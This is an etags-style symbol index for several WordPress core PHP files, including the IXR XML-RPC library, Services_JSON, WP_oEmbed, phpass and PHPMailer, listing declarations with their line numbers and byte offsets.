	function getFullHeader() {getFullHeader1603,53350
class WP_Http_Encoding {WP_Http_Encoding1617,53606
	public static function compress( $raw, $level = 9, $supports = null ) {compress1631,54056
	public static function compress( $raw, $level = 9, $supports = null ) {level1631,54056
	public static function decompress( $compressed, $length = null ) {decompress1649,54678
	public static function decompress( $compressed, $length = null ) {length1649,54678
		if ( false !== ( $decompressed = @gzinflate( $compressed ) ) )decompressed1654,54799
		if ( false !== ( $decompressed = WP_Http_Encoding::compatible_gzinflate( $compressed ) ) )decompressed1657,54890
		if ( false !== ( $decompressed = @gzuncompress( $compressed ) ) )decompressed1660,55009
			$decompressed = @gzdecode( $compressed );decompressed1664,55142
	 * function cannot handle out of the box. The following function has been created fromcannot1677,55464
	public static function compatible_gzinflate($gzData) {compatible_gzinflate1693,56246
			$i = 10;i1697,56435
			$flg = ord( substr($gzData, 3, 1) );flg1698,56447
					$i = $i + 2 + $xlen;i1702,56587
					$i = strpos($gzData, "\0", $i) + 1;i1705,56639
					$i = strpos($gzData, "\0", $i) + 1;i1707,56701
					$i = $i + 2;i1709,56762
			$decompressed = @gzinflate( substr($gzData, $i, -8) );decompressed1711,56785
		$decompressed = @gzinflate( substr($gzData, 2) );decompressed1717,56973
	public static function accept_encoding() {accept_encoding1731,57246
		$type = array();type1732,57290
	public static function content_encoding() {content_encoding1752,57738
	public static function should_decode($headers) {should_decode1764,57977
	 * Each function is tested instead of checking for the zlib extension, tois1778,58390
	public static function is_available() {is_available1786,58594

wordpress/wp-includes/class-IXR.php,15232
class IXR_Value {IXR_Value48,1967
    var $data;data49,1985
    var $type;type50,2000
    function IXR_Value($data, $type = false)IXR_Value52,2016
    function IXR_Value($data, $type = false)type52,2016
        $this->data = $data;data54,2067
            $type = $this->calculateType();type56,2118
        $this->type = $type;type58,2172
            foreach ($this->data as $key => $value) {key61,2310
            for ($i = 0, $j = count($this->data); $i < $j; $i++) {j66,2479
    function calculateType()calculateType72,2643
        if ($this->data === true || $this->data === false) {data74,2678
            $this->data = get_object_vars($this->data);data94,3311
    function getXml()getXml109,3677
                $return = '<array><data>'."\n";return126,4263
                $return = '<struct>'."\n";return134,4579
                foreach ($this->data as $name => $value) {name135,4622
					$name = htmlspecialchars($name);name136,4681
    function isStruct($array)isStruct157,5280
        $expected = 0;expected159,5316
        foreach ($array as $key => $value) {key160,5339
class IXR_MessageIXR_Message177,5605
    var $message;message179,5625
    var $messageType;  // methodCall / methodResponse / faultmessageType180,5643
    var $faultCode;faultCode181,5705
    var $faultString;faultString182,5725
    var $methodName;methodName183,5747
    var $params;params184,5768
    var $_arraystructs = array();   // The stack used to keep track of the current array/struct_arraystructs187,5817
    var $_arraystructs = array();   // The stack used to keep track of the current array/struct_arraystructs187,5817
    var $_arraystructstypes = array(); // Stack keeping track of if things are structs or array_arraystructstypes188,5913
    var $_arraystructstypes = array(); // Stack keeping track of if things are structs or array_arraystructstypes188,5913
    var $_currentStructName = array();  // A stack as well_currentStructName189,6009
    var $_currentStructName = array();  // A stack as well_currentStructName189,6009
    var $_param;_param190,6068
    var $_value;_value191,6085
    var $_currentTag;_currentTag192,6102
    var $_currentTagContents;_currentTagContents193,6124
    var $_parser;_parser195,6176
    function IXR_Message($message)IXR_Message197,6195
        $this->message =& $message;message199,6236
    function parse()parse202,6279
        $header = preg_replace( '/<\?xml.*?\?'.'>/', '', substr($this->message, 0, 100), 1);header206,6457
        $this->message = substr_replace($this->message, $header, 0, 100);message207,6550
        $this->_parser = xml_parser_create();_parser211,6702
        $chunk_size = 262144; // 256Kb, parse in chunks to avoid the RAM usage on very large messageschunk_size218,7123
        $final = false;final219,7225
                $final = true;final222,7319
            $part = substr($this->message, 0, $chunk_size);part224,7364
            $this->message = substr($this->message, $chunk_size);message225,7424
            $this->faultCode = $this->params[0]['faultCode'];faultCode237,7812
            $this->faultString = $this->params[0]['faultString'];faultString238,7874
    function tag_open($parser, $tag, $attr)tag_open243,7978
        $this->_currentTagContents = '';_currentTagContents245,8028
        $this->currentTag = $tag;currentTag246,8069
                $this->messageType = $tag;messageType251,8218
    function cdata($parser, $cdata)cdata265,8740
    function tag_close($parser, $tag)tag_close270,8835
        $valueFlag = false;valueFlag272,8879
                $value = (int)trim($this->_currentTagContents);value276,8977
                $valueFlag = true;valueFlag277,9041
                $value = (double)trim($this->_currentTagContents);value280,9126
                $valueFlag = true;valueFlag281,9193
                $value = (string)trim($this->_currentTagContents);value284,9278
                $valueFlag = true;valueFlag285,9345
                $value = new IXR_Date(trim($this->_currentTagContents));value288,9440
                $valueFlag = true;valueFlag289,9513
                    $value = (string)$this->_currentTagContents;value294,9725
                    $valueFlag = true;valueFlag295,9790
                $value = (boolean)trim($this->_currentTagContents);value299,9898
                $valueFlag = true;valueFlag300,9966
                $value = base64_decode($this->_currentTagContents);value303,10051
                $valueFlag = true;valueFlag304,10119
                $value = array_pop($this->_arraystructs);value309,10290
                $valueFlag = true;valueFlag311,10402
                $this->methodName = trim($this->_currentTagContents);methodName320,10723
        $this->_currentTagContents = '';_currentTagContents339,11524
class IXR_ServerIXR_Server349,11629
    var $data;data351,11648
    var $callbacks = array();callbacks352,11663
    var $callbacks = array();callbacks352,11663
    var $message;message353,11693
    var $capabilities;capabilities354,11711
    function IXR_Server($callbacks = false, $data = false, $wait = false)IXR_Server356,11735
    function IXR_Server($callbacks = false, $data = false, $wait = false)data356,11735
            $this->callbacks = $callbacks;callbacks360,11875
    function serve($data = false)serve368,12031
                $data = file_get_contents('php://input');data379,12520
                $data =& $HTTP_RAW_POST_DATA;data381,12599
        $this->message = new IXR_Message($data);message384,12669
        $result = $this->call($this->message->methodName, $this->message->params);result391,13024
        $r = new IXR_Value($result);r399,13260
        $resultxml = $r->getXml();resultxml400,13297
        $xml = <<<EODxml403,13359
    function call($methodname, $args)call419,13567
        $method = $this->callbacks[$methodname];method424,13775
            $args = $args[0];args429,13991
        // Are we dealing with a function or a method?or432,14032
            // It's a class method - check it existsmethod434,14157
            $method = substr($method, 5);method435,14210
                return new IXR_Error(-32601, 'server error. requested class method "'.$method.'" does not exist.');method437,14302
            $result = $this->$method($args);result441,14463
            $result = call_user_func($method, $args);result453,15031
    function error($error, $message = false)error458,15126
    function error($error, $message = false)message458,15126
            $error = new IXR_Error($error, $message);error462,15294
    function output($xml)output467,15406
        $xml = '<?xml version="1.0"?>'."\n".$xml;xml469,15438
        $length = strlen($xml);length470,15488
    function hasMethod($method)hasMethod479,15719
    function setCapabilities()setCapabilities484,15828
        $this->capabilities = array(capabilities487,15907
    function getCapabilities($args)getCapabilities503,16446
    function setCallbacks()setCallbacks508,16531
    function listMethods($args)listMethods515,16783
    function multiCall($methodcalls)multiCall522,17029
        $return = array();return525,17132
            $method = $call['methodName'];method527,17201
            $params = $call['params'];params528,17244
                $result = new IXR_Error(-32600, 'Recursive calls to system.multicall are forbidden');result530,17332
                $result = $this->call($method, $params);result532,17455
class IXR_RequestIXR_Request553,17908
    var $method;method555,17928
    var $args;args556,17945
    var $xml;xml557,17960
    function IXR_Request($method, $args)IXR_Request559,17975
        $this->method = $method;method561,18022
        $this->args = $args;args562,18055
        $this->xml = <<<EODxml563,18084
            $v = new IXR_Value($arg);v572,18287
    function getLength()getLength579,18478
    function getXml()getXml584,18551
class IXR_ClientIXR_Client597,18673
    var $server;server599,18692
    var $port;port600,18709
    var $path;path601,18724
    var $useragent;useragent602,18739
    var $response;response603,18759
    var $message = false;message604,18778
    var $message = false;message604,18778
    var $debug = false;debug605,18804
    var $debug = false;debug605,18804
    var $timeout;timeout606,18828
    var $headers = array();headers607,18846
    var $headers = array();headers607,18846
    var $error = false;error610,18917
    var $error = false;error610,18917
    function IXR_Client($server, $path = false, $port = 80, $timeout = 15)IXR_Client612,18942
    function IXR_Client($server, $path = false, $port = 80, $timeout = 15)path612,18942
            $bits = parse_url($server);bits616,19100
            $this->server = $bits['host'];server617,19140
            $this->port = isset($bits['port']) ? $bits['port'] : 80;port618,19183
            $this->path = isset($bits['path']) ? $bits['path'] : '/';path619,19252
                $this->path = '/';path623,19406
            $this->server = $server;server626,19472
            $this->path = $path;path627,19509
            $this->port = $port;port628,19542
        $this->useragent = 'The Incutio XML-RPC PHP Library';useragent630,19585
        $this->timeout = $timeout;timeout631,19647
    function query()query634,19689
        $args = func_get_args();args636,19716
        $method = array_shift($args);method637,19749
        $request = new IXR_Request($method, $args);request638,19787
        $length = $request->getLength();length639,19839
        $xml = $request->getXml();xml640,19880
        $r = "\r\n";r641,19915
        $request  = "POST {$this->path} HTTP/1.0$r";request642,19936
        foreach( $this->headers as $header => $value ) {header650,20268
            $fp = @fsockopen($this->server, $this->port, $errno, $errstr, $this->timeout);fp663,20627
            $fp = @fsockopen($this->server, $this->port, $errno, $errstr);fp665,20735
            $this->error = new IXR_Error(-32300, 'transport error - could not open socket');error668,20840
        $contents = '';contents672,20999
        $debugContents = '';debugContents673,21023
        $gotFirstLine = false;gotFirstLine674,21052
        $gettingHeaders = true;gettingHeaders675,21083
            $line = fgets($fp, 4096);line677,21144
                    $this->error = new IXR_Error(-32300, 'transport error - HTTP status code was not 200');error681,21310
                $gotFirstLine = true;gotFirstLine684,21470
                $gettingHeaders = false;gettingHeaders687,21559
        $this->message = new IXR_Message($contents);message702,22021
            $this->error = new IXR_Error(-32700, 'parse error. not well formed');error705,22139
            $this->error = new IXR_Error($this->message->faultCode, $this->message->faultString);error711,22347
    function getResponse()getResponse719,22540
    function isError()isError725,22687
    function getErrorCode()getErrorCode730,22765
    function getErrorMessage()getErrorMessage735,22841
class IXR_ErrorIXR_Error748,22980
    var $code;code750,22998
    var $message;message751,23013
    function IXR_Error($code, $message)IXR_Error753,23032
        $this->code = $code;code755,23078
        $this->message = htmlspecialchars($message);message756,23107
    function getXml()getXml759,23167
        $xml = <<<EODxml761,23195
class IXR_Date {IXR_Date790,23665
    var $year;year791,23682
    var $month;month792,23697
    var $day;day793,23713
    var $hour;hour794,23727
    var $minute;minute795,23742
    var $second;second796,23759
    var $timezone;timezone797,23776
    function IXR_Date($time)IXR_Date799,23796
    function parseTimestamp($timestamp)parseTimestamp809,24030
        $this->year = date('Y', $timestamp);year811,24076
        $this->month = date('m', $timestamp);month812,24121
        $this->day = date('d', $timestamp);day813,24167
        $this->hour = date('H', $timestamp);hour814,24211
        $this->minute = date('i', $timestamp);minute815,24256
        $this->second = date('s', $timestamp);second816,24303
        $this->timezone = '';timezone817,24350
    function parseIso($iso)parseIso820,24387
        $this->year = substr($iso, 0, 4);year822,24421
        $this->month = substr($iso, 4, 2);month823,24463
        $this->day = substr($iso, 6, 2);day824,24506
        $this->hour = substr($iso, 9, 2);hour825,24547
        $this->minute = substr($iso, 12, 2);minute826,24589
        $this->second = substr($iso, 15, 2);second827,24634
        $this->timezone = substr($iso, 17);timezone828,24679
    function getIso()getIso831,24730
    function getXml()getXml836,24885
    function getTimestamp()getTimestamp841,24995
class IXR_Base64IXR_Base64853,25198
    var $data;data855,25217
    function IXR_Base64($data)IXR_Base64857,25233
        $this->data = $data;data859,25270
    function getXml()getXml862,25306
class IXR_IntrospectionServer extends IXR_ServerIXR_IntrospectionServer874,25477
    var $signatures;signatures876,25528
    var $help;help877,25549
    function IXR_IntrospectionServer()IXR_IntrospectionServer879,25565
    function addCallback($method, $callback, $args, $help)addCallback913,26745
    function call($methodname, $args)call920,26946
            $args = array($args);args924,27069
        $method = $this->callbacks[$methodname];method931,27358
        $signature = $this->signatures[$methodname];signature932,27407
        $returnType = array_shift($signature);returnType933,27460
        $ok = true;ok941,27738
        $argsbackup = $args;argsbackup942,27758
        for ($i = 0, $j = count($args); $i < $j; $i++) {j943,27787
            $arg = array_shift($args);arg944,27844
            $type = array_shift($signature);type945,27883
                        $ok = false;ok950,28071
                        $ok = false;ok956,28263
                        $ok = false;ok961,28440
                        $ok = false;ok967,28630
                        $ok = false;ok973,28837
    function methodSignature($method)methodSignature985,29195
        $types = $this->signatures[$method];types991,29448
        $return = array();return992,29493
    function methodHelp($method)methodHelp1025,30515
class IXR_ClientMulticall extends IXR_ClientIXR_ClientMulticall1037,30664
    var $calls = array();calls1039,30711
    var $calls = array();calls1039,30711
    function IXR_ClientMulticall($server, $path = false, $port = 80)IXR_ClientMulticall1041,30738
    function IXR_ClientMulticall($server, $path = false, $port = 80)path1041,30738
        $this->useragent = 'The Incutio XML-RPC PHP Library (multicall client)';useragent1044,30864
    function addCall()addCall1047,30952
        $args = func_get_args();args1049,30981
        $methodName = array_shift($args);methodName1050,31014
        $struct = array(struct1051,31056
    function query()query1058,31204

wordpress/wp-includes/class-json.php,5836
define('SERVICES_JSON_SLICE', 1);SERVICES_JSON_SLICE62,3049
define('SERVICES_JSON_IN_STR',  2);SERVICES_JSON_IN_STR67,3165
define('SERVICES_JSON_IN_ARR',  3);SERVICES_JSON_IN_ARR72,3283
define('SERVICES_JSON_IN_OBJ',  4);SERVICES_JSON_IN_OBJ77,3401
define('SERVICES_JSON_IN_CMT', 5);SERVICES_JSON_IN_CMT82,3519
define('SERVICES_JSON_LOOSE_TYPE', 16);SERVICES_JSON_LOOSE_TYPE87,3610
define('SERVICES_JSON_SUPPRESS_ERRORS', 32);SERVICES_JSON_SUPPRESS_ERRORS92,3706
 * $json = new Services_JSON();json101,3879
 * $value = array('foo', 'bar', array(1, 2, 'baz'), array(3, array(4)));value104,3990
 * $output = $json->encode($value);output105,4063
 * $input = file_get_contents('php://input', 1000000);input111,4236
 * $value = $json->decode($input);value112,4291
class Services_JSONServices_JSON115,4341
	function Services_JSON($use = 0)Services_JSON133,4984
		$this->use = $use;use135,5021
	function utf162utf8($utf16)utf162utf8149,5374
		$bytes = (ord($utf16[0]) << 8) | ord($utf16[1]);bytes156,5571
	function utf82utf16($utf8)utf82utf16193,6711
	function encode($var)encode237,8151
	function encodeUnsafe($var)encodeUnsafe253,8740
	function _encode($var)_encode268,9275
				$ascii = '';ascii287,9603
				$strlen_var = strlen($var);strlen_var288,9620
					$ord_var_c = ord($var[$c]);ord_var_c296,9825
						case $ord_var_c == 0x08:ord_var_c299,9880
						case $ord_var_c == 0x09:ord_var_c302,9948
						case $ord_var_c == 0x0A:ord_var_c305,10016
						case $ord_var_c == 0x0C:ord_var_c308,10084
						case $ord_var_c == 0x0D:ord_var_c311,10152
						case $ord_var_c == 0x22:ord_var_c315,10221
						case $ord_var_c == 0x2F:ord_var_c316,10252
						case $ord_var_c == 0x5C:ord_var_c317,10283
							$char = pack('C*', $ord_var_c, ord($var[$c + 1]));char336,10825
							$utf16 = $this->utf82utf16($char);utf16338,10899
							$char = pack('C*', $ord_var_c,char350,11273
							$utf16 = $this->utf82utf16($char);utf16354,11388
							$char = pack('C*', $ord_var_c,char366,11762
							$utf16 = $this->utf82utf16($char);utf16371,11904
							$char = pack('C*', $ord_var_c,char383,12278
							$utf16 = $this->utf82utf16($char);utf16389,12449
							$char = pack('C*', $ord_var_c,char401,12822
							$utf16 = $this->utf82utf16($char);utf16408,13022
					$properties = array_map(array($this, 'name_value'),properties436,14050
				$elements = array_map(array($this, '_encode'), $var);elements450,14389
				$vars = get_object_vars($var);vars461,14630
				$properties = array_map(array($this, 'name_value'),properties463,14666
	* array-walking function for use in generating JSON-formatted name-value pairsfor483,15134
	function name_value($name, $value)name_value491,15425
		$encoded_value = $this->_encode($value);encoded_value493,15464
	function reduce_string($str)reduce_string510,15902
		$str = preg_replace(array(str512,15935
	function decode($str)decode541,16713
		$str = $this->reduce_string($str);str543,16739
				$m = array();m556,16923
					$delim = substr($str, 0, 1);delim572,17397
					$chrs = substr($str, 1, -1);chrs573,17431
					$utf8 = '';utf8574,17465
					$strlen_chrs = strlen($chrs);strlen_chrs575,17482
						$substr_chrs_c_2 = substr($chrs, $c, 2);substr_chrs_c_2579,17564
						$ord_chrs_c = ord($chrs[$c]);ord_chrs_c580,17611
							case $substr_chrs_c_2 == '\b':substr_chrs_c_2583,17670
							case $substr_chrs_c_2 == '\t':substr_chrs_c_2587,17765
							case $substr_chrs_c_2 == '\n':substr_chrs_c_2591,17860
							case $substr_chrs_c_2 == '\f':substr_chrs_c_2595,17955
							case $substr_chrs_c_2 == '\r':substr_chrs_c_2599,18050
							case $substr_chrs_c_2 == '\\"':substr_chrs_c_2604,18146
							case $substr_chrs_c_2 == '\\\'':substr_chrs_c_2605,18185
							case $substr_chrs_c_2 == '\\\\':substr_chrs_c_2606,18225
							case $substr_chrs_c_2 == '\\/':substr_chrs_c_2607,18265
								$utf16 = chr(hexdec(substr($chrs, ($c + 2), 2)))utf16616,18591
						$stk = array(SERVICES_JSON_IN_ARR);stk671,20260
						$arr = array();arr672,20302
							$stk = array(SERVICES_JSON_IN_OBJ);stk675,20389
							$obj = array();obj676,20432
							$stk = array(SERVICES_JSON_IN_OBJ);stk678,20470
							$obj = new stdClass();obj679,20513
					$chrs = substr($str, 1, -1);chrs687,20674
					$chrs = $this->reduce_string($chrs);chrs688,20708
					$strlen_chrs = strlen($chrs);strlen_chrs702,20935
						$top = end($stk);top706,21018
						$substr_chrs_c_2 = substr($chrs, $c, 2);substr_chrs_c_2707,21042
							$slice = substr($chrs, $top['where'], ($c - $top['where']));slice712,21312
								$parts = array();parts725,21959
									$key = $this->decode($parts[1]);key729,22107
									$val = $this->decode($parts[2]);val730,22149
									$key = $parts[1];key739,22467
									$val = $this->decode($parts[2]);val740,22494
								$chrs = substr_replace($chrs, ' ', $i, 1);chrs800,25423
	function isError($data, $code = null)isError823,25835
	function isError($data, $code = null)code823,25835
	class Services_JSON_Error extends PEAR_ErrorServices_JSON_Error838,26159
		function Services_JSON_Error($message = 'unknown error', $code = null,Services_JSON_Error840,26208
		function Services_JSON_Error($message = 'unknown error', $code = null,code840,26208
									$mode = null, $options = null, $userinfo = null)mode841,26281
	* @todo Ultimately, this class shall be descended from PEAR_Errorshall850,26434
	class Services_JSON_ErrorServices_JSON_Error852,26505
		function Services_JSON_Error($message = 'unknown error', $code = null,Services_JSON_Error854,26535
		function Services_JSON_Error($message = 'unknown error', $code = null,code854,26535
									$mode = null, $options = null, $userinfo = null)mode855,26608

wordpress/wp-includes/class-oembed.php,4022
class WP_oEmbed {WP_oEmbed20,420
	var $providers = array();providers21,438
	var $providers = array();providers21,438
	function __construct() {__construct28,570
		// The WP_Embed class disables discovery for non-unfiltered_html users, so only providers in this array will be used for them.disables30,650
		$this->providers = apply_filters( 'oembed_providers', array(providers32,875
	 * The do-it-all function that takes a URL and attempts to return the HTML.that58,3429
	function get_html( $url, $args = '' ) {get_html68,3901
	function get_html( $url, $args = '' ) {args68,3901
		$provider = false;provider69,3942
		foreach ( $this->providers as $matchmask => $data ) {matchmask74,4029
				$matchmask = '#' . str_replace( '___wildcard___', '(.+)', preg_quote( str_replace( '*', '___wildcard___', $matchmask ), '#' ) ) . '#i';matchmask79,4199
				$provider = str_replace( '{format}', 'json', $providerurl ); // JSON is easier to deal with than XMLprovider82,4383
			$provider = $this->discover( $url );provider88,4550
		if ( !$provider || false === $data = $this->fetch( $provider, $url, $args ) )data90,4591
	function discover( $url ) {discover102,5033
		$providers = array();providers103,5062
		if ( $html = wp_remote_retrieve_body( wp_remote_get( $url ) ) ) {html106,5110
			$linktypes = apply_filters( 'oembed_linktypes', array(linktypes109,5232
			$html = substr( $html, 0, stripos( $html, '</head>' ) );html116,5471
			$tagfound = false;tagfound119,5555
			foreach ( $linktypes as $linktype => $format ) {linktype120,5577
					$tagfound = true;tagfound122,5668
					$atts = shortcode_parse_atts( $link );atts129,5830
	function fetch( $provider, $url, $args = '' ) {fetch159,6741
	function fetch( $provider, $url, $args = '' ) {args159,6741
		$args = wp_parse_args( $args, wp_embed_defaults() );args160,6790
		$provider = add_query_arg( 'maxwidth', (int) $args['width'], $provider );provider162,6846
		$provider = add_query_arg( 'maxheight', (int) $args['height'], $provider );provider163,6922
		$provider = add_query_arg( 'url', urlencode($url), $provider );provider164,7000
			$result = $this->_fetch_with_format( $provider, $format );result167,7116
	function _fetch_with_format( $provider_url_with_args, $format ) {_fetch_with_format184,7749
		$provider_url_with_args = add_query_arg( 'format', $format, $provider_url_with_args );provider_url_with_args185,7816
		$response = wp_remote_get( $provider_url_with_args );response186,7905
		if ( ! $body = wp_remote_retrieve_body( $response ) )body189,8068
		$parse_method = "_parse_$format";parse_method191,8141
	function _parse_json( $response_body ) {_parse_json201,8305
		return ( ( $data = json_decode( trim( $response_body ) ) ) && is_object( $data ) ) ? $data : false;data202,8347
	function _parse_xml( $response_body ) {_parse_xml211,8537
			$errors = libxml_use_internal_errors( 'true' );errors213,8630
			$data = simplexml_load_string( $response_body );data214,8681
			$return = new stdClass;return219,8825
			foreach ( $data as $key => $value )key220,8852
	function data2html( $data, $url ) {data2html235,9291
		$return = false;return239,9400
				$title = ! empty( $data->title ) && is_string( $data->title ) ? $data->title : '';title248,9673
				$return = '<a href="' . esc_url( $url ) . '"><img src="' . esc_url( $data->url ) . '" alt="' . esc_attr($title) . '" width="' . esc_attr($data->width) . '" height="' . esc_attr($data->height) . '" /></a>';return249,9760
					$return = $data->html;return255,10077
					$return = '<a href="' . esc_url( $url ) . '">' . esc_html( $data->title ) . '</a>';return260,10197
				$return = false;return264,10310
	function _strip_newlines( $html, $data, $url ) {_strip_newlines280,10775
			$html = str_replace( array( "\r\n", "\n" ), '', $html );html282,10866
function &_wp_oembed_get_object() {_wp_oembed_get_object299,11119
	static $wp_oembed;wp_oembed300,11155
		$wp_oembed = new WP_oEmbed();wp_oembed303,11204

wordpress/wp-includes/class-phpass.php,3185
class PasswordHash {PasswordHash36,1106
	var $itoa64;itoa6437,1127
	var $iteration_count_log2;iteration_count_log238,1141
	var $portable_hashes;portable_hashes39,1169
	var $random_state;random_state40,1192
	function PasswordHash($iteration_count_log2, $portable_hashes)PasswordHash42,1213
		$this->itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';itoa6444,1280
			$iteration_count_log2 = 8;iteration_count_log247,1430
		$this->iteration_count_log2 = $iteration_count_log2;iteration_count_log248,1460
		$this->portable_hashes = $portable_hashes;portable_hashes50,1516
		$this->random_state = microtime() . uniqid(rand(), TRUE); // removed getmypid() for compatibility reasonsrandom_state52,1562
	function get_random_bytes($count)get_random_bytes55,1674
		$output = '';output57,1712
			$output = fread($fh, $count);output60,1813
			$output = '';output65,1901
				$this->random_state =random_state67,1959
			$output = substr($output, 0, $count);output72,2099
	function encode64($input, $count)encode6478,2167
		$output = '';output80,2205
		$i = 0;i81,2221
			$value = ord($input[$i++]);value83,2238
	function gensalt_private($input)gensalt_private101,2697
		$output = '$P$';output103,2734
	function crypt_private($password, $setting)crypt_private111,2919
		$output = '*0';output113,2967
			$output = '*1';output115,3026
		$id = substr($setting, 0, 3);id117,3046
		$count_log2 = strpos($this->itoa64, $setting[3]);count_log2122,3189
		$count = 1 << $count_log2;count126,3304
		$salt = substr($setting, 4, 8);salt128,3334
			$hash = md5($salt . $password, TRUE);hash139,3782
				$hash = md5($hash . $password, TRUE);hash141,3831
			$hash = pack('H*', md5($salt . $password));hash144,3907
				$hash = pack('H*', md5($hash . $password));hash146,3962
		$output = substr($setting, 0, 12);output150,4038
	function gensalt_extended($input)gensalt_extended156,4139
		$count_log2 = min($this->iteration_count_log2 + 8, 24);count_log2158,4177
		$count = (1 << $count_log2) - 1;count161,4355
		$output = '_';output163,4391
	function gensalt_blowfish($input)gensalt_blowfish174,4668
		$itoa64 = './ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';itoa64184,5172
		$output = '$2a$';output186,5253
		$i = 0;i191,5418
			$c1 = ord($input[$i++]);c1193,5435
			$c1 = ($c1 & 0x03) << 4;c1195,5496
			$c2 = ord($input[$i++]);c2201,5589
			$c1 = ($c2 & 0x0f) << 2;c1204,5665
			$c2 = ord($input[$i++]);c2206,5694
	function HashPassword($password)HashPassword215,5843
		$random = '';random217,5880
			$random = $this->get_random_bytes(16);random220,5953
			$hash =hash221,5995
				$random = $this->get_random_bytes(3);random229,6199
			$hash =hash230,6241
			$random = $this->get_random_bytes(6);random237,6389
		$hash =hash238,6430
		# in a crypt(3)-like function used _both_ for generating newused245,6628
	function CheckPassword($password, $stored_hash)CheckPassword250,6774
		$hash = $this->crypt_private($password, $stored_hash);hash252,6826
			$hash = crypt($password, $stored_hash);hash254,6906
		return $hash == $stored_hash;hash256,6950

wordpress/wp-includes/class-phpmailer.php,34552
class PHPMailer {PHPMailer40,2156
  public $Priority          = 3;Priority50,2383
  public $Priority          = 3;Priority50,2383
  public $CharSet           = 'iso-8859-1';CharSet56,2484
  public $CharSet           = 'iso-8859-1';CharSet56,2484
  public $ContentType       = 'text/plain';ContentType62,2601
  public $ContentType       = 'text/plain';ContentType62,2601
  public $Encoding          = '8bit';Encoding69,2801
  public $Encoding          = '8bit';Encoding69,2801
  public $ErrorInfo         = '';ErrorInfo75,2918
  public $ErrorInfo         = '';ErrorInfo75,2918
  public $From              = 'root@localhost';From81,3032
  public $From              = 'root@localhost';From81,3032
  public $FromName          = 'Root User';FromName87,3150
  public $FromName          = 'Root User';FromName87,3150
  public $Sender            = '';Sender94,3364
  public $Sender            = '';Sender94,3364
  public $Subject           = '';Subject100,3466
  public $Subject           = '';Subject100,3466
  public $Body              = '';Body107,3643
  public $Body              = '';Body107,3643
  public $AltBody           = '';AltBody116,3974
  public $AltBody           = '';AltBody116,3974
  protected $MIMEBody       = '';MIMEBody123,4114
  protected $MIMEBody       = '';MIMEBody123,4114
  protected $MIMEHeader     = '';MIMEHeader130,4257
  protected $MIMEHeader     = '';MIMEHeader130,4257
  protected $SentMIMEMessage     = '';SentMIMEMessage137,4405
  protected $SentMIMEMessage     = '';SentMIMEMessage137,4405
  public $WordWrap          = 0;WordWrap144,4560
  public $WordWrap          = 0;WordWrap144,4560
  public $Mailer            = 'mail';Mailer150,4682
  public $Mailer            = 'mail';Mailer150,4682
  public $Sendmail          = '/usr/sbin/sendmail';Sendmail156,4794
  public $Sendmail          = '/usr/sbin/sendmail';Sendmail156,4794
  public $PluginDir         = '';PluginDir163,4994
  public $PluginDir         = '';PluginDir163,4994
  public $ConfirmReadingTo  = '';ConfirmReadingTo169,5128
  public $ConfirmReadingTo  = '';ConfirmReadingTo169,5128
  public $Hostname          = '';Hostname177,5375
  public $Hostname          = '';Hostname177,5375
  public $MessageID         = '';MessageID184,5547
  public $MessageID         = '';MessageID184,5547
  public $Host          = 'localhost';Host198,6002
  public $Host          = 'localhost';Host198,6002
  public $Port          = 25;Port204,6108
  public $Port          = 25;Port204,6108
  public $Helo          = '';Helo210,6231
  public $Helo          = '';Helo210,6231
  public $SMTPSecure    = '';SMTPSecure217,6356
  public $SMTPSecure    = '';SMTPSecure217,6356
  public $SMTPAuth      = false;SMTPAuth223,6491
  public $SMTPAuth      = false;SMTPAuth223,6491
  public $Username      = '';Username229,6579
  public $Username      = '';Username229,6579
  public $Password      = '';Password235,6664
  public $Password      = '';Password235,6664
   * This function will not work with the win32 version.will239,6747
  public $Timeout       = 10;Timeout242,6824
  public $Timeout       = 10;Timeout242,6824
   * Sets SMTP class debugging on or off.debugging245,6861
  public $SMTPDebug     = false;SMTPDebug248,6924
  public $SMTPDebug     = false;SMTPDebug248,6924
  public $SMTPKeepAlive = false;SMTPKeepAlive256,7167
  public $SMTPKeepAlive = false;SMTPKeepAlive256,7167
  public $SingleTo      = false;SingleTo263,7349
  public $SingleTo      = false;SingleTo263,7349
  public $SingleToArray = array();SingleToArray269,7489
  public $SingleToArray = array();SingleToArray269,7489
  public $LE              = "\n";LE275,7605
  public $LE              = "\n";LE275,7605
  public $DKIM_selector   = 'phpmailer';DKIM_selector281,7709
  public $DKIM_selector   = 'phpmailer';DKIM_selector281,7709
  public $DKIM_identity   = '';DKIM_identity288,7883
  public $DKIM_identity   = '';DKIM_identity288,7883
  public $DKIM_passphrase   = '';DKIM_passphrase294,7985
  public $DKIM_passphrase   = '';DKIM_passphrase294,7985
  public $DKIM_domain     = '';DKIM_domain301,8152
  public $DKIM_domain     = '';DKIM_domain301,8152
  public $DKIM_private    = '';DKIM_private308,8317
  public $DKIM_private    = '';DKIM_private308,8317
   * Callback Action function namename311,8356
   * the function that handles the result of the send email action. Parameters:that312,8391
  public $action_function = ''; //'callbackAction';action_function321,8797
  public $action_function = ''; //'callbackAction';action_function321,8797
  public $Version         = '5.2.1';Version327,8918
  public $Version         = '5.2.1';Version327,8918
  public $XMailer         = '';XMailer333,9025
  public $XMailer         = '';XMailer333,9025
  protected   $smtp           = NULL;smtp339,9202
  protected   $smtp           = NULL;smtp339,9202
  protected   $to             = array();to340,9240
  protected   $to             = array();to340,9240
  protected   $cc             = array();cc341,9281
  protected   $cc             = array();cc341,9281
  protected   $bcc            = array();bcc342,9322
  protected   $bcc            = array();bcc342,9322
  protected   $ReplyTo        = array();ReplyTo343,9363
  protected   $ReplyTo        = array();ReplyTo343,9363
  protected   $all_recipients = array();all_recipients344,9404
  protected   $all_recipients = array();all_recipients344,9404
  protected   $attachment     = array();attachment345,9445
  protected   $attachment     = array();attachment345,9445
  protected   $CustomHeader   = array();CustomHeader346,9486
  protected   $CustomHeader   = array();CustomHeader346,9486
  protected   $message_type   = '';message_type347,9527
  protected   $message_type   = '';message_type347,9527
  protected   $boundary       = array();boundary348,9563
  protected   $boundary       = array();boundary348,9563
  protected   $language       = array();language349,9604
  protected   $language       = array();language349,9604
  protected   $error_count    = 0;error_count350,9645
  protected   $error_count    = 0;error_count350,9645
  protected   $sign_cert_file = '';sign_cert_file351,9680
  protected   $sign_cert_file = '';sign_cert_file351,9680
  protected   $sign_key_file  = '';sign_key_file352,9716
  protected   $sign_key_file  = '';sign_key_file352,9716
